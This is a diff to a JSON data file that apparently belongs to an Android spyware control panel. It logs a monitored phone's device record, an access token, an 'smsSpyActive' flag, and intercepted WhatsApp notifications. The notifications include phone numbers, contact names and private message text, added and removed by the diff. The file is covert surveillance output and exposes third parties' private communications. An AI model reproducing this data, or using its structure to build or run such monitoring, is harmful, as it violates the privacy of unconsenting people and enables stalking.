@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776906642016,
+    "lastSeen": 1776906645142,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 851-3406-5819",
+        "content": "Oke",
+        "time": "23/04 09:10",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776906645578
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 823-1199-7104",
+        "content": "Balik sore kmr16 kemarin aku kasih di kmr17",
+        "time": "23/04 09:10",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776906644376
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "prily 🤍",
+        "content": "Memanggil…",
+        "time": "23/04 09:10",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776906644365
+      },
       {
         "appName": "WhatsApp",
         "sender": "prily 🤍",
@@ -3995,30 +4019,6 @@
         "time": "22/04 17:28",
         "pkg": "com.whatsapp",
         "receivedAt": 1776850120287
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "maya ml",
-        "content": "Eh lebih tepatnya di oper²",
-        "time": "22/04 17:28",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776850120086
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎prily 🤍 & +62 851-1746-5790",
-        "content": "Telepon video grup berlangsung",
-        "time": "22/04 17:22",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776849766139
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎+62 851-1746-5790 & prily 🤍",
-        "content": "Telepon video grup berlangsung",
-        "time": "22/04 17:22",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776849754300
       }
     ],
     "galleryPhotos": [],
